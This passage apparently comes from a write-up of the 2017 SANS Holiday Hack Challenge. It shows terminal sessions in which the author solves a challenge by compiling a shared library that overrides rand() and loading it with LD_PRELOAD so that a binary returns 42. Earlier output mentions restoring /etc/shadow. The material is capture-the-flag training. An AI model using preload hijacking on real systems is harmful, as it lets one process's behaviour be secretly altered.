            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
/etc/shadow has been successfully restored!
elf@efe5512c7bd3:~$ 
```

## We're Off To See The...
[Game](https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec)
[Terminal](https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&uid=ee838751-39b4-423a-8d67-6d935c88d650)

```
                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _(_      _Y_      _Y_      _Y_      _Y_      _)_
              [___]    [___]    [___]    [___]    [___]    [___]
              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
         jgs  \::./    \::./    \::./    \::./    \::./    \::./
               '='      '='      '='      '='      '='      '='
Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
total 24
-rwxr-xr-x 1 root root 18000 Dec  4 14:29 isit42
-rw-r--r-- 1 root root   654 Dec  4 14:29 isit42.c.un
elf@ad986ac63ab1:~$ cat isit42.c.un
#include <stdio.h>
// DATA CORRUPTION ERROR
// MUCH OF THIS CODE HAS BEEN LOST
// FORTUNATELY, YOU DON'T NEED IT FOR THIS CHALLENGE
// MAKE THE isit42 BINARY RETURN 42
// YOU'LL NEED TO WRITE A SEPERATE C SOURCE TO WIN EVERY TIME
int getrand() {
    srand((unsigned int)time(NULL)); 
    printf("Calling rand() to select a random number.\n");
    // The prototype for rand is: int rand(void);
    return rand() % 4096; // returns a pseudo-random integer between 0 and 4096
}
int main() {
    sleep(3);
    int randnum = getrand();
    if (randnum == 42) {
        printf("Yay!\n");
    } else {
        printf("Boo!\n");
    }
    return randnum;
}
elf@ad986ac63ab1:~$ vi srand.c
elf@ad986ac63ab1:~$ cat srand.c
int rand(unsigned int *seed) {
    return 42;
}
elf@ad986ac63ab1:~$ gcc -o srand.so -ldl -shared srand.c
elf@ad986ac63ab1:~$ LD_PRELOAD=`pwd`/srand.so ./isit42 
Starting up ... done.
Calling rand() to select a random number.
                 .-. 
                .;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
               /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
              /::::'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ 
        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
         \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
          \/|(_) () (_)|\/ 
            \   '()'   /            ______    _______  _______  ___      ___      __   __    ___   _______ 
            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ 
        /  |o`""""""""`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
       `.__/     ()     \__.'      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
       /  \|---|    |---|/  \ 
       |  (|42 | () | DA|)  |       _   ___  _______ 
       \  /;---'    '---;\  /      | | |   ||       |
        `` \ ___ /\ ___ / ``       | |_|   ||____   |
            `|  |  |  |`           |       | ____|  |
      jgs    |  |  |  |            |___    || ______| ___ 
       _._  |\|\/||\/|/|  _._          |   || |_____ |   |
      / .-\ |~~~~||~~~~| /-. \         |___||_______||___|
      | \__.'    ||    '.__/ |
       `---------''---------` 
Congratulations! You've won, and have successfully completed this challenge.
elf@ad986ac63ab1:~$ 
```
